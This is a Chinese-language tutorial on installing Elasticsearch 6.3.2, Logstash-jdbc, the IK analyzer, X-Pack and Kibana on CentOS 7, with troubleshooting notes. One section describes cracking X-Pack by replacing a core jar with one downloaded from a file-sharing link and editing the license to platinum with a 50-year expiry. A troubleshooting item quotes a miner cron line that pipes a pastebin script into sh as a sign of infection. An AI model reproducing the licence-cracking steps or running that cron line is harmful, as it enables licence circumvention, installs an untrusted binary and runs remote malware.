# Centos 7 部署 ELK6.3.2 +x-pack+logstash-input-jdbc +IK分词器

**logstash 和 IK 的版本一定要和 ES的版本一致。**

## ES

### 前提

Java 环境

### ES下载安装

```shell
cd /home/elasticsearch
wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.3.2.zip
unzip elasticsearch-6.3.2.zip
```

### 配置

ES 不允许 Root。用户登陆。so。我们要创建ES用户

#### 创建 ES 用户

```shell
# 创建ES组
groupadd es
# 在ES组下创建ES用户，并设置密码为12345678
useradd es -g es -p 12345678
```

#### 更改文件夹属主和属组

```shell
cd /home/elasticsearch/
chown -R es:es elasticsearch-6.3.2/
```

#### ES 配置外网访问及Java服务访问

```shell
cd /home/elasticsearch/elasticsearch-6.3.2/config
vim elasticsearch.yml
#增加如下一行代码 注意yml文件 需要在每一项前面加空格。
 http.host: 0.0.0.0
 http.port: 9200
#Java 访问9300端口  ，可有可无，如果是 使用 Springboot esTemplate 的话 必须要有
 network.host: 0.0.0.0
#ps:如果是阿里云 那么还需要如下配置: xxxx  是你阿里云的公网地址
 network.publish_host: xxxx
 
```

#### 添加下面设置 elasticsearch 的配置

```shell
 vim /etc/security/limits.conf 
 * hard nofile 65536
 * soft nofile 65536
 * soft    nproc           4096
 * hard    nproc           4096
```

添加下面配置：

```shell
vim /etc/sysctl.conf
vm.max_map_count=262144
#立即生效，执行：
/sbin/sysctl -p
```



### 启动ES服务

#### 启动

**!!! ES服务必须用非root 用户启动**

```shell
#切换用户
su  es
cd /home/elasticsearch/elasticsearch-6.3.2/bin/
#es 前台启动,关闭终端,es服务就会终止
./elasticsearch

# 后台启动服务
./elasticsearch -d

# 本机测试是否启动成功
curl 127.0.0.1:9200

#外网的话,直接浏览器访问ip+:9200 就ok
#如果是云服务器 外网访问不到的话,请参考遇到的问题12 
```

#### 停止

```shell
#停止后台运行的es
#通过如下两个命令 可以找到es的Pid 
jsp
ps -ef | grep elastic
#找到es 的pid
kill -9 esPid
```

#### 查看日志

```shell

# 查看日志
tail -f /home/elasticsearch/elasticsearch-6.3.2/logs/elasticsearch.log


```



## logstash-input-jdbc 

logstash-input-jdbc 是logstash 的一个插件，所以要先安装logstash

#### logstash下载 安装

```shell
cd /home/elasticsearch
wget https://artifacts.elastic.co/downloads/logstash/logstash-6.3.2.tar.gz
tar -zxvf logstash-6.3.2.tar.gz
```

#### logstash-input-jdbc 安装

```shell
cd logstash-6.3.2
bin/logstash-plugin install logstash-input-jdbc
```

#### 查看对应的插件版本

```shell
#这个要自己查，不同版本的安装的插件版本可能不同 
cd /home/elasticsearch/logstash-6.3.2/vendor/bundle/jruby/2.3.0/gems/logstash-input-jdbc-4.3.9/
```

对应的 jdbc 插件版本是 4.3.9

#### 下载mysql数据库连接包

mysql驱动版本无要求，应该都可以

```shell
cd /home/elasticsearch
wget https://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.45.tar.gz
tar -zxvf mysql-connector-java-5.1.45.tar.gz
```



#### 编写同步的配置文件

```shell
cd /home/elasticsearch/logstash-6.3.2
mkdir mysql-conf
cd mysql-conf
vim jdbc.conf
```

##### jdbc.conf配置文件模板

```shell
input {
stdin {
}
jdbc {
    #mysql 相关 jdbc 配置  ！！！这里需要修改
    jdbc_connection_string => "jdbc:mysql://x.x.x.x:3306/x?serverTimezone=UTC&zeroDateTimeBehavior=convertToNull"
    #！！！这里需要修改
    jdbc_user => "x"
    #！！！这里需要修改
    jdbc_password => "x"
    #jdbc 连接 mysql 驱动的文件目录，第 3 步下载的文件目录
    jdbc_driver_library => "/home/elasticsearch/mysql-connector-java-5.1.45/mysql-connector-java-5.1.45-bin.jar"
    jdbc_driver_class => "com.mysql.jdbc.Driver"
    jdbc_paging_enabled => "true"
    jdbc_page_size => "50000"
    #mysql 文件，也可以直接写 SQL 语句在此处
    #statement => "SELECT * from * "
    # 去对应的文件位置编写sql代码。就用vim 就可以，千万别用自己电脑写完文件在上传到服务器 这种方式可能会引发编码问题
    statement_filepath => "/home/elasticsearch/jdbc.sql"
    #定时操作，和 crontab 一样
    schedule => "*/2 * * * *"
    type => "item"
    #是否记录上次执行结果，如果为真，将会把上次执行到的 tracking_column 字段的值记录下来，保存到
    last_run_metadata_path => "/home/elasticsearch/logstash-6.3.2/config/last_id"
    record_last_run => "true"
    #是否需要记录某个 column 的值，如果 record_last_run 为真，可以自定义我们需要 track 的 column 名称，此时该参数就要为 true. 否则默认 track 的是 timestamp 的值.
    use_column_value => "true"
    #如果 use_column_value 为真，需配置此参数. track 的数据库 column 名，该 column 必须是递增的。
    
    # 这个就用更新时间 来做增量更新 es 通过判断这个字段变化 来增量更新
    tracking_column => "updateTime"
    #是否清除 last_run_metadata_path 的记录，如果为真那么每次都相当于从头开始查询所有的数据库记录
    clean_run => "false"
    #是否将 字段 (column) 名称转小写
    lowercase_column_names => "false"
   }
}
#此处暂不做过滤处理，如果需要可添加
filter {}
output {
#输出到 elasticsearch 的配置，配置很简单，一看就懂，就不作说明了
elasticsearch {
    hosts => ["127.0.0.1:9200"]
    #！！！这里需要修改
    index => "x"
    document_id => "%{id}"
    template_overwrite => true
   }

}
```



#### 启动logstash

##### 启动

```shell
cd /home/elasticsearch/logstash-6.3.2/bin/
./logstash -f /home/elasticsearch/logstash-6.3.2/mysql-config/jdbc.conf
#多配置文件运行 mysql-config 这个文件夹下 所有的配置文件 都好执行,不用加*
./logstash -f /home/elasticsearch/logstash-6.3.2/mysql-config/
#后台运行 
nohup ./logstash -f /home/elasticsearch/logstash-6.3.2/mysql-config/jdbc.conf&
```

##### 停止

```shell
# jps 或 ps
jps -l
ps -ef | grep logstash

#找到es 的pid
kill -9 logstashPid
```

##### 查看日志

```shell
cd /home/elasticsearch/logstash-6.3.2/bin/
tail -f nohup.out
```





## IK分词器

### 插件安装

```shell
cd /home/elasticsearch/elasticsearch6.3.2
./bin/elasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v6.3.2/elasticsearch-analysis-ik-6.3.2.zip
```

### 重启 es

1.  查找 es 进程

```shell
ps -ef | grep elastic
```

2.  终止进程 

```shell
#这里写查出的进程PID
kill -9 PID
```

3.  启动 es 后台运行

## X-Pack 安装破解

**由于在 elasticsearch 在 6.3 版本之后 x-pack 是默认安装好的，所以不再需要用户自己去安装**

**!!!  如果 你的es服务是部署在外网上,那么就一定要安装,不要侥幸,被挖矿的话,会自动kill 你的es 进程**

### 1.启动 elasticsearch 后通过 curl 启动 trial license

```shell
curl -H "Content-Type:application/json" -XPOST http://127.0.0.1:9200/_xpack/license/start_trial?acknowledge=true

#看到如下返回信息表示启用测试版成功
{"acknowledged":true,"trial_was_started":true,"type":"trial"}
```
![c677f262-d43e-11e9-a42e-acde48001122](https://i.loli.net/2019/09/11/BW8TZkc9JgyIiLd.png )

### 2.设置用户名密码

```shell
vim /home/elasticsearch/elasticsearch-6.3.2/config/elasticsearch.yml
#增加如下配置,别忘了空格
 xpack.security.transport.ssl.enabled: true
 
 #重启ES
 
cd /home/elasticsearch/elasticsearch-6.3.2
bin/elasticsearch-setup-passwords interactive
#接下来 就是y 然后配置密码  这块的密码推荐都用一个,方便记录使用
------------------------------------------------------
```

![b782ad5a-d458-11e9-bb76-acde48001122](https://i.loli.net/2019/09/11/wQTuKMRN3c4jXGm.png )

### 3.测试登陆

Chrome浏览器head 插件 登陆:

用户名:elastic

密码: 刚才 自己设置的

### 4.破解x-pack

6.3 版本以后  都默认安装 -pack 插件的.所以直接破解

#### 替换x-pack-core-6.3.2.jar

**x-pack-core-6.3.2.jar下载地址**

链接:https://pan.baidu.com/s/1zV7B0d3yyA5iMGje2lfU_A  密码:gr20

将x-pack-core-6.3.2.jar 文件 上传至/home/elasticsearch/ 文件夹下

```shell
cd /home/elasticsearch/
#用下载的文件夹覆盖原有的jar 
cp x-pack-core-6.3.2.jar /home/elasticsearch/elasticsearch-6.3.2/modules/x-pack/x-pack-core/
```

#### 获取 license 证书

1.  https://license.elastic.co/registration 填些用户名，邮箱（重要，获取下载链接），Country 选择 China，其他信息随意填写

2.  将邮箱内的文件夹下载

3.  修改文件中的内容，将两个属性改为

    将 "type":"basic" 替换为 "type":"platinum"    # 基础版变更为铂金版

    将 "expiry_date_in_millis":1561420799999 替换为 "expiry_date_in_millis":3107746200000    # 1 年变为 50 年

4.  使用 curl 替换 license (license.json 指的是刚刚下载修改属性后的证书，要开启 elasticsearch 服务

    ```shell
    vim /home/elasticsearch/elasticsearch-6.3.2/config/elasticsearch.yml
    xpack.security.enabled: false
    xpack.security.transport.ssl.enabled: false
    
    #重启es
    #将刚才修改的license.json 上传至/home/elasticsearch/ 文件夹
    cd /home/elasticsearch/
    #替换 证书
    curl -H "Content-Type: application/json" -XPUT 'http://127.0.0.1:9200/_xpack/license?acknowledge=true' -d @license.json
    
    #查看证书
    curl -XGET http://127.0.0.1:9200/_license
    
    #开启校验
    vim /home/elasticsearch/elasticsearch-6.3.2/config/elasticsearch.yml
    xpack.security.enabled: true
    xpack.security.transport.ssl.enabled: true
    ```

    

### 5.增加x-pack后 logstash 配置文件改动

```shell
vim /home/elasticsearch/logstash-6.3.2/mysql-config/jdbc.conf




output {
	#输出到 elasticsearch 的配置，配置很简单，一看就懂，就不作说明了
    elasticsearch {
        hosts => ["127.0.0.1:9200"]
       # ----- 增加部分------
        #x-pack es 账号密码
        user => "elastic"
        password => "youpwd"
        # -----------
    }

}
```



##  kibana

### kibana安装

```shell
cd /home/elasticsearch
wget https://artifacts.elastic.co/downloads/kibana/kibana-6.3.2-linux-x86_64.tar.gz
tar -zvxf kibana-6.3.2-linux-x86_64.tar.gz
```

### kibana配置

```shell
vim /home/elasticsearch/kibana-6.3.2-linux-x86_64/config/kibana.yml

 #记住空格
 server.host: "0.0.0.0"
 elasticsearch.url: "http://127.0.0.1:9200"
 #这里 为什么用户名 不是es 的x-pack 用户名 我也不知道,但是我这么配置使用,没问题.因为我的密码一致 就没在这里纠结
 elasticsearch.username: "kibana"
 elasticsearch.password: "你的密码"
 
 
 
 #开启防火墙端口
 firewall-cmd --add-port=5601/tcp --permanent
 #云服务器 记得配置安全规则
 
```

### 启动kibana

#### 启动

```shell
cd /home/elasticsearch/kibana-6.3.2-linux-x86_64/bin/
#前台启动,
./kibana
# 后台启动 
nohup ./kibana &
#启动成功后,浏览器访问端口+:5601
#输入kibana 的账号密码,即可登录
```

![c89cd644-d631-11e9-9758-acde48001122](https://i.loli.net/2019/09/13/5qDhfAp3wnICURE.png )

#### 停止

```shell

#停止
#通过下面的命令找到pid,然后kill
fuser -n tcp 5601 

```

#### 查看日志

```shell
#日志查看
cd /home/elasticsearch/kibana-6.3.2-linux-x86_64/bin/
tail -f nohup.out
```

### 想在 monitoring 页面显示到 logstash 的监控。需要在 logstash.yml 里配置 ：

```shell
xpack.monitoring.elasticsearch.url: "http://127.0.0.1:9200"

xpack.monitoring.elasticsearch.username: "logstash_system" 

xpack.monitoring.elasticsearch.password: "youpwd"

```

### Kibana汉化:

https://github.com/anbai-inc/Kibana_Hanization/tree/master/old



## 遇到的问题

#### 1.修改elasticsearch.yml ES 启动报错 权限不够

 root 用户下为普通用户授权就可以了
例如我的普通用户名是 es

```shell
chown es  /home/elasticsearch/elasticsearch-6.3.2 -R
```

#### 2.启动报错max file descriptors [4096] for elasticsearch process is too low, increase to at least [65536]max number of threads [1024] for user [hadoop] is too low, increase to at least [2048]
max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]

切换到 root 用户

添加下面设置 es 是用户

```shell
 vim /etc/security/limits.conf 
 * hard nofile 65536
 * soft nofile 65536
 * soft    nproc           4096
 * hard    nproc           4096
```

添加下面配置：

```shell
vim /etc/sysctl.conf
vm.max_map_count=262144
#立即生效，执行：
/sbin/sysctl -p
#最好退出用户 ，重新登陆系统。
```



#### 3.SpringBoot 报错：org.elasticsearch.client.transport.NoNodeAvailableException: None of the configured nodes are available

这个问题就是因为没加这行配置

 ```shell
 network.host: 0.0.0.0
 ```



#### 4.Springboot 配置文件中cluster-name的值如何确定

cluster-name: elasticsearch

浏览器直接访问部署es服务的服务器

http://X.X.X.X:9200/

可以看到cluster_name 的属性值

#### 5.LogStash 错误：Logstash could not be started because there is already another instance usin

其他报错 同样也可以查看lock 文件 如果存在 删除即可。

这个错误是因为反复执行	`./logstash -f /home/elasticsearch/logstash-6.3.2/mysql-config/jdbc.conf`命令，导致加锁。

解决方案：

```shell
cd /home/elasticsearch/logstash-6.3.2/data/
#查看是否存在 .lock 文件，如果存在把它删除
ls -alh
#删除
rm .lock
```

#### 6.logstash同步多个表的数据

```shell
#jdbc 文档结构 为这样 就可以正常执行
input {
    jdbc {
    type => "A"

    }
    jdbc {
    type => "B"

    }
}

output {
    if[type] == "A" {
        elasticsearch {
       
        }
    }

    if[type] == "B" {
           elasticsearch {
           
           }
    }
}
```

#### 7.索引 要在logstash 同步数据前创建。

如果不在logstash 同步数据前创建 ，那么logstash会在同步时 自动判断并设置数据类型，并增加keyword设置，keyword是用来精确命中数据的，如果字段为 会导致分词查询 时不准确。

#### 8.ES 支持 距离排序。

#### 9. elasticsearch 启动 就提示 kill 

可能是因为jvm 内存的原因:

如果是个人服务器,搭建es 就是为了学习,那么可以配置

```shell
vim /home/elasticsearch/elasticsearch-6.3.2/config/jvm.options
#将
#-Xms1g
#-Xmx1g
#改为
-Xms512m
-Xmx512m
```

真正业务的话:

```shell
#建议昂,配置为机器的一半内存
-Xms4g
-Xmx4g
```

#### 10.[ERROR] [Ruby-0-Thread-1]: sourceloader - No configuration found in the configured sources.

把 **jdbc.conf**文件放在**logstash的/config**目录下，这个问题就解决了。

#### 11. Exception when executing JDBC query {:exception=>#<Sequel::DatabaseError: Java::ComMysqlJdbcExceptionsJdbc4::CommunicationsException: The last packet successfully received from the server was 7,208,937 milliseconds ago.  The last packet sent successfully to the server was 7,208,936 milliseconds ago. is longer than the server configured value of 'wait_timeout'. You should consider either expiring and/or testing connection validity before use in your application, increasing the server configured values for client timeouts, or using the Connector/J connection property 'autoReconnect=true' to avoid this problem.>}
Wed Sep 11 09:12:03 CST 2019 WARN: Establishing SSL connection without server's identity verification is not recommended. According to MySQL 5.5.45+, 5.6.26+ and 5.7.6+ requirements SSL connection must be established by default if explicit option isn't set. For compliance with existing applications not using SSL the verifyServerCertificate property is set to 'false'. You need either to explicitly disable SSL by setting useSSL=false, or set useSSL=true and provide truststore for server certificate verification.



在执行logstash 同步sql的时候,可能会报出上面两个警告.解决方案:

增加jdbc配置:

**autoReconnect=true&useSSL=false**

如下所示:

jdbc_connection_string => "jdbc:mysql://xxxx?autoReconnect=true&useSSL=false&erverTimezone=UTC&zeroDateTimeBehavior=convertToNull"



查看mysql 超时时间:

```sql
show variables like '%timeout%'

#主要看这两个属性 单位是秒 ,
#interactive_timeout
#wait_timeout

#Linux 系统下，配置文件为路径 /etc/my.cnf
# 10 小时  默认值均为 28800
wait_timeout=36000  
interactive_timeout=36000 
```



我遇到这个问题 大概率 是因为SQL 关联表过多,结果太大,logstash 日志中SQL可以打印出来,但是es索引库内一条数据都没有.,我用同样的配置文件只是修改了sql语句,很快就执行完,没有警告.因此猜测可能是sql结果集太大,查询超时,导致警告.

#### 12.外网访问不到问题排查

1.  看一看 elasticsearch.yml 中配置 是否完整
2.  云端的控制台安全策略 是否开启端口.
3.   防火墙端口

```shell
#打开防火墙端口 命令
firewall-cmd --zone=public --add-port=9200/tcp
```

#### 13.es服务配置完成后,用了一段时间频繁挂掉

这个时候就要看看是不是被挖矿了,尤其是部署在外网上的服务

以下是简单测试方案:

#####  top 命令 看看显示的cpu 占用 是否正常

#####  ps 命令 ,是否正常.

##### crontab -l 命令查看

如果看到如下情况,那基本没跑了

```shell
*/15 * * * * (curl -fsSL https://pastebin.com/raw/HdjSc4JR||wget -q -O- https://pastebin.com/raw/HdjSc4JR)|sh

```

我的解决方案就是重装,然后 es  配置x-pack.当时搜 也搜到 不少的解决方案,但是我没能找到一个百分百有效的方案,当时我们很赶,没时间尝试,害怕 万一没清理干净,死灰复燃,影响程序运行.最后就选择的最稳妥的方案,